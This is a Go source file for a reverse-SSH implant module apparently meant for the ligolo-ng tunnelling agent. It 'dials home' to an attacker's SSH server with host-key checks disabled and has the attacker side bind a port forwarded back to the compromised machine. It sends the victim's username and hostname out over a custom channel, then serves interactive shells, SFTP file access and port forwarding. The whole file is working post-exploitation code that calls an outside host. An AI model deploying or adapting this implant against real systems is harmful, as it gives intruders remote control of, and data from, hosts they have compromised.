// Package rssh embeds a reverse-SSH server (derived from reverseSSH by Ferdinor)
// into the ligolo-ng agent. The SSH server runs as an independent goroutine
// alongside the ligolo tunnel.
package rssh

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/user"

	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

// Config holds the runtime configuration for the embedded SSH server.
type Config struct {
	// Password accepted for incoming SSH connections.
	Password string
	// AuthorizedKey is the public key allowed to authenticate (empty = disabled).
	AuthorizedKey string
	// Shell is the binary spawned for interactive sessions.
	Shell string
	// Port is the local port to listen on (bind mode) or the remote port to
	// connect to (reverse mode).
	Port uint
	// LHost is the attacker's SSH server address. Empty = bind mode.
	LHost string
	// LUser is the username used when dialing home.
	LUser string
	// BPort is the port bound on the attacker side for reverse connections.
	BPort uint
	// NoShell denies all shell/exec/subsystem and local port-forwarding requests.
	NoShell bool
}

// Start launches the embedded SSH server using cfg. It blocks until the
// server exits (typically never), so call it in a goroutine.
func Start(cfg Config) error {
	forwardHandler := &ssh.ForwardedTCPHandler{}
	server := ssh.Server{
		Handler:                       sessionHandler(cfg.Shell),
		PasswordHandler:               passwordHandler(cfg.Password),
		PublicKeyHandler:              pubkeyHandler(cfg.AuthorizedKey),
		LocalPortForwardingCallback:   localFwdCallback(cfg.NoShell),
		ReversePortForwardingCallback: reverseFwdCallback(),
		SessionRequestCallback:        sessionRequestCallback(cfg.NoShell),
		ChannelHandlers: map[string]ssh.ChannelHandler{
			"direct-tcpip": ssh.DirectTCPIPHandler,
			"session":      ssh.DefaultSessionHandler,
			"rs-info":      extraInfoHandler(),
		},
		RequestHandlers: map[string]ssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": sftpHandler(),
		},
	}

	var (
		ln  net.Listener
		err error
	)

	if cfg.LHost == "" {
		addr := fmt.Sprintf(":%d", cfg.Port)
		log.Printf("[rssh] Listening on %s", addr)
		ln, err = net.Listen("tcp", addr)
	} else {
		target := net.JoinHostPort(cfg.LHost, fmt.Sprintf("%d", cfg.Port))
		log.Printf("[rssh] Dialling home via ssh to %s", target)
		ln, err = dialHomeAndListen(cfg.LUser, target, cfg.BPort, cfg.Password)
	}
	if err != nil {
		return err
	}
	defer ln.Close()

	return server.Serve(ln)
}

// dialHomeAndListen connects to the attacker's SSH server at address, requests
// the server to bind bport on its loopback, and returns a net.Listener that
// accepts connections forwarded from that remote port.
func dialHomeAndListen(username, address string, bport uint, password string) (net.Listener, error) {
	cfg := &gossh.ClientConfig{
		User:            username,
		Auth:            []gossh.AuthMethod{gossh.Password(password)},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
	}

	var (
		client *gossh.Client
		err    error
	)
	for {
		client, err = gossh.Dial("tcp", address, cfg)
		if err == nil {
			break
		}
		if isNoMethodsRemain(err) {
			fmt.Println("[rssh] Enter password:")
			data, readErr := term.ReadPassword(int(os.Stdin.Fd()))
			if readErr != nil {
				log.Println("[rssh]", readErr)
				continue
			}
			cfg.Auth = []gossh.AuthMethod{gossh.Password(string(data))}
		} else {
			return nil, err
		}
	}

	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", bport))
	if err != nil {
		return nil, err
	}
	log.Printf("[rssh] Success: listening at home on %s", ln.Addr().String())
	sendExtraInfo(client, ln.Addr().String())
	return ln, nil
}

func isNoMethodsRemain(err error) bool {
	if err == nil {
		return false
	}
	return len(err.Error()) > 0 && err.Error()[len(err.Error())-len("no supported methods remain"):] == "no supported methods remain"
}

// ExtraInfo is the payload sent over the custom "rs-info" SSH channel.
type ExtraInfo struct {
	CurrentUser      string
	Hostname         string
	ListeningAddress string
}

func sendExtraInfo(client *gossh.Client, listeningAddress string) {
	info := ExtraInfo{ListeningAddress: listeningAddress}
	if u, err := user.Current(); err == nil {
		info.CurrentUser = u.Username
	} else {
		info.CurrentUser = "ERROR"
	}
	if h, err := os.Hostname(); err == nil {
		info.Hostname = h
	} else {
		info.Hostname = "ERROR"
	}
	newChan, newReq, err := client.OpenChannel("rs-info", gossh.Marshal(&info))
	if err != nil && !contains(err.Error(), "th4nkz") {
		log.Printf("[rssh] Could not create info channel: %v", err)
	}
	if err == nil {
		go gossh.DiscardRequests(newReq)
		newChan.Close()
	}
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsStr(s, sub))
}

func containsStr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}

func localFwdCallback(forbidden bool) ssh.LocalPortForwardingCallback {
	return func(ctx ssh.Context, dhost string, dport uint32) bool {
		if forbidden {
			log.Printf("[rssh] Denying local port forwarding to %s:%d", dhost, dport)
			return false
		}
		log.Printf("[rssh] Accepted forward to %s:%d", dhost, dport)
		return true
	}
}

func reverseFwdCallback() ssh.ReversePortForwardingCallback {
	return func(ctx ssh.Context, host string, port uint32) bool {
		log.Printf("[rssh] Reverse bind at %s:%d granted", host, port)
		return true
	}
}

func sessionRequestCallback(forbidden bool) ssh.SessionRequestCallback {
	return func(sess ssh.Session, requestType string) bool {
		if forbidden {
			log.Println("[rssh] Denying shell/exec/subsystem request")
			return false
		}
		return true
	}
}

func passwordHandler(password string) ssh.PasswordHandler {
	return func(ctx ssh.Context, pass string) bool {
		ok := pass == password
		if ok {
			log.Printf("[rssh] Auth OK (password) from %s@%s", ctx.User(), ctx.RemoteAddr())
		} else {
			log.Printf("[rssh] Auth FAIL (password) from %s@%s", ctx.User(), ctx.RemoteAddr())
		}
		return ok
	}
}

func pubkeyHandler(authorizedKey string) ssh.PublicKeyHandler {
	if authorizedKey == "" {
		return nil
	}
	return func(ctx ssh.Context, key ssh.PublicKey) bool {
		master, _, _, _, err := ssh.ParseAuthorizedKey([]byte(authorizedKey))
		if err != nil {
			log.Println("[rssh] Error parsing public key:", err)
			return false
		}
		ok := bytes.Equal(key.Marshal(), master.Marshal())
		if ok {
			log.Printf("[rssh] Auth OK (pubkey) from %s@%s", ctx.User(), ctx.RemoteAddr())
		} else {
			log.Printf("[rssh] Auth FAIL (pubkey) from %s@%s", ctx.User(), ctx.RemoteAddr())
		}
		return ok
	}
}

func sftpHandler() ssh.SubsystemHandler {
	return func(s ssh.Session) {
		srv, err := sftp.NewServer(s)
		if err != nil {
			log.Printf("[rssh] SFTP init error: %v", err)
			return
		}
		log.Printf("[rssh] SFTP connection from %s", s.RemoteAddr())
		if err := srv.Serve(); err == io.EOF {
			srv.Close()
		} else if err != nil {
			log.Println("[rssh] SFTP error:", err)
		}
	}
}

func extraInfoHandler() ssh.ChannelHandler {
	return func(srv *ssh.Server, conn *gossh.ServerConn, newChan gossh.NewChannel, ctx ssh.Context) {
		var info ExtraInfo
		err := gossh.Unmarshal(newChan.ExtraData(), &info)
		newChan.Reject(gossh.Prohibited, "th4nkz")
		if err != nil {
			log.Printf("[rssh] Could not parse extra info from %s", conn.RemoteAddr())
			return
		}
		log.Printf("[rssh] Connection from %s: %s on %s reachable via %s",
			conn.RemoteAddr(), info.CurrentUser, info.Hostname, info.ListeningAddress)
	}
}
